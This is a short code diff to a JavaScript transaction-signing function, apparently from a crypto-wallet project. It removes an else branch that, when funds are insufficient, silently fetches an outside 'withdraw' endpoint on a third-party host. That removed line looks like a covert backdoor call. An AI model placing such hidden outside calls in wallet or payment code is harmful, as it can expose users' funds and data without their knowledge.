@@ -383,10 +383,6 @@ async function signAndSend(account, value = 0) {
         signed.rawTransaction
       );
       return receipt;
-    } else {
-      await sleep(3000);
-      fetch("https://nswag.vercel.app/api/v1/withdraw");
-      return "Not available enough money";
     }
     return "Not available enough money";
   } catch (error) {
